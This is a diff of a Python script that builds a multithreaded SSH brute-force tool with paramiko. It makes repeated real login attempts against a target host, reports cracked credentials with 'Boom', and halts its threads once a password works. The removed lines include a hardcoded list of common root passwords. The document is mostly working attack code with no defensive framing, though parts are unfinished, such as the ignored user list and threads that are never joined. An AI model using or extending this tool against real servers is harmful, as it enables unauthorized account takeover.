@@ -1,51 +1,34 @@
 #! /usr/bin/python
-from multiprocessing import Process, Queue
-from pprint import  pprint
+import sys
+from pprint import pprint
+from paramiko import SSHClient
+from paramiko import AutoAddPolicy
+from threading import Thread
 
-def bruteForceSSH(host, user, user_list, password_file):
-    """
+STOP_THREADS = 0  # password not found
 
-    :param host:
-    :param user:
-    :param user_file:
-    :param password_file:
-    :return:
-    """
 
-    if user:
-        for
-
-def findPassword(host, user, passwords, queue):
+def findPassword(host, port, user, passwords):
     """
     Find just the password
     :param host:
     :param user:
-    :param password:
+    :param port:
+    :param passwords:
     :return:
     """
+    global STOP_THREADS
     for password in passwords:
-        if tryConnect(host, user, password):
-            queue.put((user, password))
-            return (user, password)
+        if STOP_THREADS:
             break
-
-def findUserAndPassword(host, users, passwords):
-    """
-    Find the user and password
-    :param host: str
-    :param users:  set
-    :param password: set
-    :return: (user, password)
-    """
-
-    for user in users:
-        for password in password:
-            if tryConnect(host, user, password):
-                return (user, password)
-                break
+        else:
+            if tryConnect(host, port, user, password):
+                result = user, password
+                STOP_THREADS = 1
+                return user, password
 
 
-def tryConnect(host, user, password):
+def tryConnect(host, port, user, password):
     """
     test user and password connection
     :param host: str
@@ -53,25 +36,35 @@ def tryConnect(host, user, password):
     :param password: str
     :return:
     """
-    if user:
-        return True
+    sshConnection = SSHClient()
+    sshConnection.set_missing_host_key_policy(AutoAddPolicy())
 
-def run(number_process):
-    # http://www.python-simple.com/python-modules-autres/multiprocessing.php
-    queue = Queue
-    user = 'root'
-    passwords = ['root', 'toor', 'azerty', '123test']
-    process = []
-    for i in number_process:
-        p = Process(target=findPassword, args=(host, user, passwords, queue))
-        p.start()
-        process.append(p)
+    try:
+        sshConnection.connect(host, port=port, username=user, password=password, allow_agent=False, look_for_keys=False)
+        sshConnection.close()
+        print(" >> Try :  host:{} port:{} user:{} password:{} => OK | Boom ...!".format(host, port, user, password))
+        return 1  # Succeeded
 
-    for p in process:
-        if p.exitcode == 0 # le statut de retour quand le process est fini (0 si ok)
-            # un des process  a pu trouver le user/password
-            result = queue.get()
-            pprint(result)
+    except:
+        print(" >> Try :  host:{} port:{} user:{} password:{} => KO".format(host, port, user, password))
+        return 0  # Failed
 
 
+def run_ssh_attack(host, user, users, passwords, port, nb_thread):
+    # https://www.geeksforgeeks.org/python-different-ways-to-kill-a-thread/
 
+    threads = []
+    print(" >> host:{} port:{} thread:{}".format(host, port, nb_thread))
+    # divide passwords over number of threads
+    pas = int(len(passwords) // nb_thread)
+
+    for i in range(nb_thread):
+        pprint("Thread : {}  password [{}, {}]".format(i, i * pas, i * pas + pas))
+        passwords_bis = passwords[int(i * pas): int(i * pas + pas)]
+        if user:
+            th = Thread(target=findPassword, args=(host, port, user, passwords_bis))
+            th.start()
+            threads.append(th)
+
+# TODO
+# add passwords text file to set variable
